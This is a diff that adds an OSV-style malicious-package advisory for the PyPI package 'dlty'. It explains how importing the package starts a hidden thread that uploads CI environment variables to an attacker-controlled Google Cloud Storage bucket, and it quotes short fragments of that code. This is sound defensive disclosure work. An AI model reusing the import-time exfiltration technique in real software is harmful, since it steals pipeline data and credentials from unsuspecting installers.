@@ -1,0 +1,110 @@
+{
+  "modified": "2026-05-13T20:13:39Z",
+  "published": "2026-05-12T07:43:57Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-3690",
+  "summary": "Malicious code in dlty (PyPI)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (494f5fbab24a26771e84ce06eea5303b7d1b9135b505a6d93a01c417603f1902)\nImporting the `dlty` package triggers an active data-exfiltration channel from the installer to third-party-controlled infrastructure. `dlty/__init__.py` imports `dlty.dlt`, which defines a class `DataLeakTest` whose class body contains `threading.Thread(target=leak_data).start()` — meaning the thread runs at class-definition/import time, not on instantiation. The target function `leak_data` (dlty/dlt.py) first performs an HTTP GET to https://www.google.de as a connectivity probe, then reads the environment variables RUN, PIPELINE, STEP and uploads them with a timestamp as a blob to the hardcoded Google Cloud Storage bucket `data-leak-test` via `storage.Client().get_bucket('data-leak-test').blob(run).upload_from_string(...)`. This uses the installer's ambient GCP credentials (Application Default Credentials) to write installer-side environment variables (commonly CI/CD metadata) to author-controlled storage. Exceptions are swallowed with a reassuring print, and the exfiltration is placed in a class body rather than __init__ to make it less visible during casual review. Metadata fields are placeholders (Example Author, pypa/sampleproject URL), the README is a single line, and the package name does not advertise any of this behavior. This is a one-way installer→attacker exfiltration path and meets the criteria for an active supply-chain attack.\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "dlty"
+      },
+      "versions": [
+        "0.0.10",
+        "1.0.3"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "domains": [
+            "www.google.de"
+          ],
+          "evidence_files": [
+            {
+              "path": "dlty/dlt.py",
+              "sha256": "c1b93390fedd0535b012b3a64261aca8064f440fd2c41824a1b1338cd2261a2c",
+              "tlsh": "91f0d883a8aa19f65623a68dd00501615fa3a97f67896020f80a039c4f18e3f32797b0"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "dlty-0.0.10-py3-none-any.whl",
+              "hashes": {
+                "blake2b_256": "6fed7e793e6639c7a977c66bfaf1514e181cdc2fa386198db407cf5167e59b70",
+                "md5": "a22bfa475493c0e8542fe5f44e927f0b",
+                "sha256": "3b3cab8c021e8bed4f924ae7a58f6d863140e1709d723b3348ad71563f502bb5"
+              }
+            },
+            {
+              "filename": "dlty-0.0.10.tar.gz",
+              "hashes": {
+                "blake2b_256": "2988a8d5d1ce7c68ceff6785e5bb5b4cc17df34667b6e369787cb344fd65380f",
+                "md5": "68b38091e99ea55a5f1143fee2a750ff",
+                "sha256": "2004ee704be5b5ad404ec0315b5042c894570037a34d58859546f18292fbb1db"
+              }
+            }
+          ],
+          "urls": [
+            "https://www.google.de"
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/dlty/0.0.10/"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/dlty/1.0.3/"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "actran@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-002375",
+        "import_time": "2026-05-13T20:10:56.581365923Z",
+        "modified_time": "2026-05-12T19:03:07Z",
+        "sha256": "1de1179058c8bfbb9c038473f9941f3a4b3db4465c9d0bcaac796b55ed58118a",
+        "source": "amazon-inspector",
+        "versions": [
+          "0.0.10"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-002381",
+        "import_time": "2026-05-13T20:10:56.630465706Z",
+        "modified_time": "2026-05-12T19:03:07Z",
+        "sha256": "494f5fbab24a26771e84ce06eea5303b7d1b9135b505a6d93a01c417603f1902",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.3"
+        ]
+      }
+    ]
+  }
+}
